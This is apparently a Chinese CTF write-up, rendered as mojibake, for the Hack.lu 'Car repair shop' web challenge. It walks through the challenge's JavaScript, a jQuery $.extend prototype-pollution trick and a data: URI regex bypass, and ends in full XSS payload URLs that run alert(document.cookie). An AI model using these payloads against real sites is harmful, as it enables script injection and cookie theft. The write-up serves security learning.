# Hack.luCTF-Car-repair-shopè¯¦è§£
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
JSé¢˜ç›®ï¼Œä»£ç å…¨åœ¨å‰ç«¯ï¼Œåˆå¹¶ä¸€ä¸‹å…³é”®ä»£ç å¦‚ä¸‹ï¼š
    const urlParams = new URLSearchParams(window.location.search)
    const h = location.hash.slice(1)
    const bugatti = new Car('Bugatti', 'T35', 'green', 'assets/images/bugatti.png')
    const porsche = new Car('Porsche', '911', 'yellow', 'assets/images/porsche.png')
    const cars = [bugatti, porsche]
    porsche.repair = () => {
        if(!bugatti.isStarted()){
            infobox(`Not so fast. Repair the other car first!`)
        }
        else if($.md5(porsche) == '9cdfb439c7876e703e307864c9167a15'){
            if(urlParams.has('help')) {
                repairWithHelper(urlParams.get('help'))
            }
        }
        else{
            infobox(`Repairing this is not that easy.`)
        }
    }
    porsche.ignition = () => {
        infobox(`Hmm ... WTF!`)
    }
    $(document).ready(() => {
        const [car] = cars
        $('.fa-power-off').click(() => car.powerOn())
        $('.fa-car').click(() => car.info())
        $('.fa-lightbulb-o').click(() => car.light())
        $('.fa-battery-quarter').click(() => car.battery())
        $('.fa-key').click(() => car.ignition())
        $('.fa-wrench').click(() => car.repair())
        $('.fa-step-forward').click(() => nextCar())
        if(h.includes('Bugatti'))
            autoStart(bugatti)
        if(h.includes('Porsche'))
            autoStart(porsche)
    })
    const nextCar = () => {
        cars.push(cars.shift())
        $(".image").attr('src', cars[0].pic);
    }
    const autoStart = (car) => {
        car.repair()
        car.ignition()
        car.powerOn()
    }
    const repairWithHelper = (src) => {
        /* who needs csp anyways !? */
        urlRegx = /^w{4,5}://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
        if (urlRegx.test(src)) {
            let s = document.createElement('script')
            s.src = src
            $('head').append(s)
        }
    }
    const infobox = (text) => {
        $('a').css({'pointer-events': 'none', 'border': 'none'})
        $('.infobox').addClass('infoAnimate')
            .text(text)
            .on('animationend', function() {
                $(this).removeClass('infoAnimate')
                $('a').css({'pointer-events': 'all', 'border': 'solid 1px rgba(255, 255, 255, .25)'})
        })
    }
    class Car {
        constructor(type, model, color, pic, key="") {
            this.type = type
            this.model = model
            this.color = color
            this.key = key
            this.pic = pic
            let started = false
            this.start = () => {
                started = true
            }
            this.isStarted = () => {
                return started
            }
        }
        powerOn() {
            if (this.isStarted()) {
                infobox(`Well Done!`)
                nextCar()
            } else {
                $('.chargeup')[0].play()
            }
        }
        info() {
            infobox(`This car is a ${this.type} ${this.model} in ${this.color}. It looks very nice! But it seems to be broken ...`)
        }
        repair() {
            if(urlParams.has('repair')) {
                $.extend(true, this, JSON.parse(urlParams.get('repair')))
            }
        }
        light() {
            infobox(`You turn on the lights ... Nothing happens.`)
        }
        battery() {
            infobox(`Hmmm, the battery is almost empty ... Maybe i can repair this somehow.`)
        }
        ignition() {
            if (this.key == "") {
                infobox(`Looks like the key got lost. No wonder the car is not starting ...`)
            }
            if (this.key == "ğŸ”‘") {
                infobox(`The car started!`)
                this.start()
            }
        }
    }
æ ¹æ®é¢˜ç›®å’Œä»£ç é€»è¾‘ï¼Œé¦–å…ˆç”Ÿæˆäº†ä¸¤ä¸ªå¸¸é‡å¯¹è±¡`bugatti`å’Œ`porsche`
    const bugatti = new Car('Bugatti', 'T35', 'green', 'assets/images/bugatti.png')
    const porsche = new Car('Porsche', '911', 'yellow', 'assets/images/porsche.png')
é€šè¯»ä»£ç æ‰¾ä¸€ä¸‹èƒ½å¤Ÿxçš„ç‚¹ï¼Œå‘ç°åœ¨`repairWithHelper`å‡½æ•°ä¸­å­˜åœ¨script
srcå¯æ§çš„æƒ…å†µï¼Œä¸è¿‡ä¼ å…¥çš„urlè¦ç»è¿‡ä¸€ä¸ªæ­£åˆ™çš„é™åˆ¶ã€‚æˆ‘ä»¬é¦–å…ˆè¿½ä¸€ä¸‹æ€ä¹ˆèƒ½è°ƒç”¨åˆ°`repairWithHelper`å‡½æ•°
    const repairWithHelper = (src) => {
        /* who needs csp anyways !? */
        urlRegx = /^w{4,5}://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
        if (urlRegx.test(src)) {
            let s = document.createElement('script')
            s.src = src
            $('head').append(s)
        }
    }
JqueryåŠ è½½å®Œdomä¹‹åï¼Œå–é”šç‚¹çš„å€¼ä¸ºhï¼Œå¹¶åˆ¤æ–­æ˜¯å¦åŒ…å«bugattiã€porscheå­—æ®µå€¼ï¼Œè€Œåå°†å¯¹è±¡ä¼ å…¥ç›¸åº”çš„autoStartå‡½æ•°æ‰§è¡Œã€‚
    if(h.includes('Bugatti'))
        autoStart(bugatti)
    if(h.includes('Porsche'))
        autoStart(porsche)
autoStartä¸­å¯¹carå¯¹è±¡çš„è°ƒç”¨æ–¹æ³•ä¸å°½ç›¸åŒã€‚å¯¹äºbugattiæ¥è¯´ï¼ŒCarç±»ä¸­å­˜åœ¨ä¸Šè¿°ä¸‰ä¸ªæ–¹æ³•ï¼Œè€Œå½“å¯¹è±¡ä¸ºporscheçš„æ—¶å€™ï¼Œæ–¹æ³•ignitionã€repairä¼šè¢«æ”¹å†™ã€‚å…¶ä¸­ï¼Œåœ¨`porsche.repair()`æ–¹æ³•ä¸­å®ç°äº†`repairWithHelper`è°ƒç”¨
    const autoStart = (car) => {
        car.repair()
        car.ignition()
        car.powerOn()
    }
çœç•¥ä¸­é—´æ­¥éª¤ï¼Œæ¢³ç†ä¸€ä¸‹è°ƒç”¨é“¾å¤§è‡´éœ€è¦ç»è¿‡ä¸¤ä¸ªé‡è¦çš„é€»è¾‘ï¼š
1ã€éœ€è¦å…ˆrepairç¬¬ä¸€è¾†åä¸ºâ€Bugattiâ€çš„è½¦ï¼Œæ”¹å˜bugatti.key = ğŸ”‘  
2ã€ä½¿$.md5(porsche) == $.md5(â€œlolâ€)
å…ˆçœ‹ç¬¬ä¸€ä¸ªç‚¹ï¼Œç”±äºCarç±»å†…éƒ¨`ignition()`æ–¹æ³•è°ƒç”¨äº†$extendï¼ŒåŒæ—¶è·å–urlå‚æ•°`repair`ç”¨æ¥åˆå¹¶Carç±»å†…å±æ€§ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ä¼ å‚è¦†ç›–keyçš„å€¼ï¼Œå› æ­¤æ„é€ `repair={"key":"%F0%9F%94%91"}`å°±èƒ½è½»æ¾è¿‡ç¬¬ä¸€ä¸ªæ­¥éª¤ã€‚
    repair() {
        if(urlParams.has('repair')) {
            $.extend(true, this, JSON.parse(urlParams.get('repair')))
        }
    }
åŒæ—¶$extend()æ–¹æ³•ä¹Ÿå­˜åœ¨åŸå‹é“¾æ±¡æŸ“é—®é¢˜ï¼Œè§æ–‡ç« :https://hackerone.com/reports/454365ã€‚è¿™ä¹Ÿæ˜¯bypassç¬¬äºŒæ­¥$.md5(porsche)
== $.md5(â€œlolâ€)çš„å…³é”®ï¼Œé‚£ä¹ˆå¦‚ä½•æ“ä½œå¯¹è±¡å¸¸é‡porscheï¼Ÿ
é¦–å…ˆï¼Œå¯ä»¥å…ˆçœ‹ä¸‹é¢çš„å–å€¼
å› ä¸º$.md5æ˜¯å¯¹ä¸€ä¸²stringç±»å‹çš„å˜é‡è¿›è¡ŒåŠ å¯†ï¼Œé‚£ä¹ˆä¼ å…¥çš„å‚æ•°ä¸ºå¯¹è±¡æ—¶ï¼ŒåŠ¿å¿…å°±ç»è¿‡ç±»å‹çš„è½¬æ¢ã€‚è‡³äºå…·ä½“æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒç†è§£ä¸ºå½“å‰å˜é‡è¿›è¡Œ`toString()`ã€‚ç”±äºporscheè¿™ä¸ªå¯¹è±¡æ²¡æœ‰`toString()`æ–¹æ³•ï¼ŒæŒ‰ç…§Javascriptçš„ç»§æ‰¿å°±ä¼šå‘ä¸ŠæŸ¥æ‰¾åŸå‹_
_proto
**(Carå¯¹è±¡)æ˜¯å¦æœ‰`toString()`ï¼ŒCarå¯¹è±¡ä¹Ÿæ²¡æœ‰`toString()`ï¼Œç»§è€Œå†å‘ä¸ŠæŸ¥æ‰¾åˆ°**proto__(Objectå¯¹è±¡)ï¼Œå­˜åœ¨toString()ï¼Œè°ƒç”¨å¹¶è¿”å›å­—ç¬¦ä¸²ï¼š
**[object Object]** ï¼Œé€šè¿‡æ‰“å°å¦‚ä¸‹çš„ä¾‹å­éªŒè¯ã€‚
å…¶æ¬¡ï¼Œå¯¹äºæ•°ç»„çš„toString()ä¼šåˆå¹¶æ•°ç»„å†…çš„é”®å€¼å¹¶è¿”å›ï¼Œé‚£ä¹ˆå¦‚ä¸‹çš„ç”¨æ³•ä¼šä½¿$.md5ç”Ÿæˆä»¥â€lolâ€ä¸ºå­—ç¬¦ä¸²çš„åŠ å¯†å€¼ã€‚
å› æ­¤ï¼Œæ—¢ç„¶æ˜¯å°†porscheå¯¹è±¡è¿›è¡Œ$.md5çš„å–å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ±¡æŸ“ç»§æ‰¿é“¾çš„æŸä¸€ä¸ª_ _proto__
ï¼Œä½¿å…¶ä¸ºarrayç±»å‹ï¼Œå¹¶èµ‹å€¼ä¸ºâ€lolâ€ï¼Œé‚£ä¹ˆtoString()åœ¨å‘ä¸Šå¯»æ‰¾è°ƒç”¨çš„æ—¶å€™å°±èƒ½è¿”å›â€lolâ€ï¼Œè€Œä¸æ˜¯åˆ°è¾¾é¡¶ç«¯ObjectåŸå‹çš„toString()æ–¹æ³•ã€‚
ç»¼ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹payloadç»•è¿‡ä»¥ä¸Šä¸¤ç‚¹çš„é™åˆ¶ï¼š
    https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?&repair={"key":"%F0%9F%94%91","__proto__":{"__proto__":["lol"]}}#PorscheBugatti
æ¥ç€å°±æ˜¯ä»¥helpä¸ºå‚æ•°çš„å¼•å…¥scriptæ ‡ç­¾çš„srcï¼Œä¸è¿‡è¦å…ˆbypassä¸€æ®µæ­£åˆ™:
    urlRegx = /^w{4,5}://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
è¿™é‡Œæ˜¯ä¸å¯èƒ½æ±¡æŸ“åŸå‹çš„ï¼Œå› ä¸ºä¼šè¢«é‡æ–°èµ‹å€¼ã€‚å¯æ§ç‚¹ä¸ºcar-repair-shopå‰åçš„å­—æ®µã€‚
å‚è€ƒå®˜æ–¹wpè§£æ³•ï¼Œç”±äºw{4,5}ä½¿å¾—åè®®å¯æ§ï¼Œç”¨data://ä½œä¸ºèµ„æºåŠ è½½æ¶æ„çš„xssï¼ŒåŒæ—¶dataä¸å…³å¿ƒmimeçš„ç±»å‹ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥æŠŠç™½åå•çš„hostæ”¾åˆ°mimeçš„ä½ç½®ã€‚å…¶å®å¯¹äºsrcè¿™ä¸ªå±æ€§æ¥è¯´ï¼Œåº”è¯¥æ˜¯éƒ½æ”¯æŒdataèµ„æºçš„è°ƒç”¨ã€‚æœ€ç»ˆpayloadå¦‚ä¸‹:
    https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/hpdoger/,alert(document.cookie)//car.key.js&repair={"key":"ğŸ”‘","__proto__":{"__proto__":["lol"]}}#BugattiPorsche
javascriptè°ƒç”¨é“¾åŠç±»å‹è½¬æ¢çœŸçš„å¯ä»¥å»æ·±ç©¶ä¸€ä¸‹ï¼Œå¸ˆå‚…ä»¬åšå­¦å¤šè¯†,orz..